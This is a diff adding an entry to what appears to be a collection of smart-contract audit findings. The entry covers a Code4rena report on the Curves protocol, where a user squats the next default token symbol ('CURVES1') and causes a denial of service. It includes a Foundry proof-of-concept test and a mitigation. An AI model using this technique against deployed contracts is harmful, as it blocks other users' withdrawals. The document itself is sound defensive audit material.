@@ -988,3 +988,34 @@ if (params.amount2 > 0) {
 ```
 
 </details>
+
+## 18.[Medium] If a user sets their curve token symbol as the default one plus the next token counter instance it will render the whole default naming functionality obsolete
+
+### Names and symbols
+
+- Summary: In the Curves protocol, a vulnerability exists where a user can set their token symbol to "CURVES N" (with N being the next token counter value), which disrupts the default naming functionality. This can lead to a denial of service (DoS) by preventing the protocol from assigning default names and symbols to new tokens.
+
+- Impact & Recommendation: It is recommended to forbid users from including "CURVES" in their symbol by implementing checks or mandating that users set their own unique names and symbols, thus preserving the default naming system's integrity.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-01-curves#m-03-if-a-user-sets-their-curve-token-symbol-as-the-default-one-plus-the-next-token-counter-instance-it-will-render-the-whole-default-naming-functionality-obsolete) & [Report](https://code4rena.com/reports/2024-01-curves)
+
+<details><summary>POC</summary>
+
+```solidity
+    function testTokenDefaultNaming() public {
+        //user1 creates a token without assigning it a name/symbol
+        vm.startPrank(user1);
+        curves.buyCurvesToken(user1, 1);
+        vm.stopPrank();
+        //user2 creates another token with name/symbol as the default ones next in line
+        vm.prank(user2);
+        curves.buyCurvesTokenWithName(user2, 1, "Curves 1", "CURVES1");
+        //This will always revert as default naming functionality won't work anymore
+        vm.startPrank(user1);
+        vm.expectRevert();
+        curves.withdraw(user1, 1);
+        vm.stopPrank();
+    }
+
+```
+
+</details>
